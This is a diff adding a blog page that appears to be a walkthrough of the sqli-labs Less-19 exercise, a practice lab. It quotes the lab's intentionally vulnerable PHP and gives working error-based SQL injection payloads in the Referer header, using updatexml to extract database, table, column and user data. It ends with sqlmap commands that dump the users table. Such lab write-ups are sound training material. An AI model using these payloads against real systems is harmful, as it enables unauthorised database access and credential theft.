@@ -1,0 +1,49 @@
+<hr>
+<h2 id="title-less19url-https-www-yuque-com-u29002979-ep2zrx-ro4t2irmar3i3pv2"><a href="#title-less19url-https-www-yuque-com-u29002979-ep2zrx-ro4t2irmar3i3pv2" class="headerlink" title="title: less19url: https://www.yuque.com/u29002979/ep2zrx/ro4t2irmar3i3pv2"></a>title: less19<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ro4t2irmar3i3pv2">https://www.yuque.com/u29002979/ep2zrx/ro4t2irmar3i3pv2</a></h2><pre><code class="bash">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+    $result1 = mysql_query($sql);
+    $row1 = mysql_fetch_array($result1);
+        if($row1)
+            {
+            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;
+            $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;
+</code></pre>
+<p>成功登录后返回referer位置，说明在<strong>数据包头referer位置有</strong>注入点</p>
+<blockquote>
+<p>Your IP ADDRESS is: 192.168.31.119<br>Your <strong>Referer</strong> is: <a href="http://192.168.31.193/Less-19/">http://192.168.31.193/Less-19/</a></p>
+</blockquote>
+<p><a name="NTGzZ"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p>
+<h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>1&#39;,updatexml(1,concat(0x7e,database(),0x7e),1))#</code></p>
+<blockquote>
+<p>Your IP ADDRESS is: 192.168.31.119<br>Your Referer is: 1’,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>XPATH syntax error: ‘<del>security</del>‘</p>
+</blockquote>
+<p><a name="hycyr"></a></p>
+<h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>1&#39;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#</code> <a name="zblHG"></a></p>
+<h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>1&#39;, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1)) -- +</code> <a name="IHMXL"></a></p>
+<h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>1&#39;, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +</code> <a name="gX5ct"></a></p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>将数据包保存后 在referer后面加上*即可</p>
+<pre><code class="bash">POST /Less-19/ HTTP/1.1
+Host: 192.168.31.193
+Content-Length: 24
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.31.193
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.31.193/Less-19/*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+passwd=admin&amp;uname=admin
+</code></pre>
+<pre><code class="bash">检测注入点
+sqlmap -r 2.txt --batch --level 4
+爆破数据库名
+sqlmap -r 2.txt --batch --level 4 --current-db
+爆破数据表名
+sqlmap -r 2.txt --batch --level 4 -D &quot;security&quot; --tables
+爆破字段内容
+sqlmap -r 2.txt --batch --level 4 -D &quot;security&quot; -T &quot;users&quot; --dump
+</code></pre>
